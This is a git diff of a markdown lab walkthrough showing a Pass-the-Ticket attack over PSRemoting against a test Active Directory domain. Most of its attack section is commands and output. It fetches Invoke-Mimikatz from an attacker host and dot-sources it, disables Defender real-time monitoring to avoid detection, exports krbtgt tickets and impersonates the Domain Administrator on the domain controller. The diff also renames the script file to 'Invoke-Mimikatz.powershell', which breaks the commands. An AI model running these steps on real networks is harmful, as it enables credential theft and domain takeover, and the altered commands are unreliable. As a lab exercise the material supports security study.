@@ -1,11 +1,13 @@
 ---
-layout: default
+layout: menu
 title: "Double Hop Bypass"
 description: "The double-hop problem occurs when, for example, a local PowerShell instance connected via PSRemoting to a remote server which is connected to the target server and an attempt to execute commands on the target server was made and was rejected. The end goal of this proof-of-concept is to execute a pass-the-ticket attack on an active directory while being remotely connected to a domain computer with administrator privileges."
-tags: [windows, pass the ticket, PTT, krbtgt, klist, double hop, double hop bypass, multi hop, multihop, bypass, mimikatz, exploitation]
+tags: [windows, pass the ticket, PTT, krbtgt, klist, double hop, double hop bypass, multi hop, multihop, bypass, mimikatz, exploitation, kerberos, kerberos authentication]
 ---
 
-# Pass-the-Ticket over PSRemoting using Invoke-Mimikatz
+# <span style="color:red">Pass-the-Ticket over PSRemoting using Invoke-Mimikatz</span>
+
+---
 
 ## ENVIRONMENT SET-UP:
 #### MACHINES:
@@ -50,7 +52,7 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
 
 #### i. Establish a session using PSRemoting
 1. Enter a session for the domain user, __BOSSMANBEN\\GConcy__:
-   ```ps1
+   ```powershell
    Enter-PSSession -ComputerName 192.168.150.128 -Credential BOSSMANBEN\GConcy
    ```
    __NOTE(S)__:
@@ -67,7 +69,7 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
    - The current established session doesn't seem to be a __*recognized*__ session.
 
 3. Register the current session while inside the PSSession created:
-   ```ps1
+   ```powershell
    Register-PSSessionConfiguration -Name GodConcy -RunAsCredential BOSSMANBEN\GConcy
    ```
    ```
@@ -88,7 +90,7 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
    ...omitted...
    ```
 
-   ```ps1
+   ```powershell
    Get-PSSessionConfiguration
    ```
    ```
@@ -116,7 +118,7 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
      - The entire session should be restarted with the proper configuration.
 
 5. Type `Restart-Service WinRM` then enter a new PSSession with the registered configuration:
-   ```ps1
+   ```powershell
    Enter-PSSession -ComputerName 192.168.150.128 -Credential BOSSMANBEN\GConcy -ConfigurationName GodConcy
    ```
    __NOTE(S)__:
@@ -150,22 +152,22 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
 #### ii. Export krbtgt tickets using Invoke-Mimikatz:
 
 1. Download the exploit to the local machine (KALI-WINDOWS):
-   ```ps1
+   ```powershell
    git clone https://github.com/samratashok/nishang
 
    cd .\nishang\Gather
    ```
 
-2. Upload __Invoke-Mimikatz.ps1__ to the remote machine (MSEDGEWIN10):
+2. Upload __Invoke-Mimikatz.powershell__ to the remote machine (MSEDGEWIN10):
    - LOCAL MACHINE (KALI-WINDOWS):
      ```sh
      python -m SimpleHTTPServer
      ```
    - PSSession (MSEDGEWIN10):
-     ```ps1
+     ```powershell
      cd $home\Desktop
 
-     Invoke-WebRequest -uri http://192.168.150.1:8000/Invoke-Mimikatz.ps1 -OutFile Invoke-Mimikatz.ps1
+     Invoke-WebRequest -uri http://192.168.150.1:8000/Invoke-Mimikatz.powershell -OutFile Invoke-Mimikatz.powershell
      ```
 
 3. Use dot source to import  __Invoke-Mimikatz__:
@@ -173,14 +175,14 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
      ```
      Set-MpPreference -DisableRealtimeMonitoring $true
 
-     . .\Invoke-Mimikatz.ps1
+     . .\Invoke-Mimikatz.powershell
      ```
      __NOTE(S)__:
-     - `-DisableRealtimeMonitoring $true` prevents the remote machine from detecting __Invoke-Mimikatz.ps1__ as a malicious script
+     - `-DisableRealtimeMonitoring $true` prevents the remote machine from detecting __Invoke-Mimikatz.powershell__ as a malicious script
      
 4. Export __*krbtgt tickets*__ using Invoke-Mimikatz:
    - PSSession (MSEDGEWIN10):
-     ```ps1
+     ```powershell
      mkdir tickets
 
      cd tickets
@@ -245,7 +247,7 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
 #### iii. Pass the ticket using Invoke-Mimikatz
 
 1. View the exported tickets:
-   ```ps1
+   ```powershell
    dir $home\Desktop\tickets
    ```
    ```
@@ -254,7 +256,7 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
    ...omitted...
    ```
 2. Pass the krbtgt ticket:
-   ```ps1
+   ```powershell
    Invoke-Mimikatz -command '"kerberos::ptt [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi"'
    ```
    ```
@@ -291,7 +293,7 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
    - The current PSSession should now be able to impersonate the Domain Administrator
 4. Check if the Domain Controller (BOSSMANBEN) now accessible:
    - Get the Primary Domain Controller for BOSSMANBEN:
-     ```ps1
+     ```powershell
      nltest /DCNAME:BOSSMANBEN
      ```
      ```
@@ -299,7 +301,7 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
      The command completed successfully
      ```
    - List contents of the file share, `C$`:
-     ```ps1
+     ```powershell
      dir \\WIN-BO2CT95INDP\C$
      ```
      ```
@@ -318,7 +320,7 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
 
      ```
    - Pass commands as the Domain Administrator:
-     ```ps1
+     ```powershell
      Invoke-Command -ComputerName WIN-BO2CT95INDP -ScriptBlock { whoami }
      ```
      ```
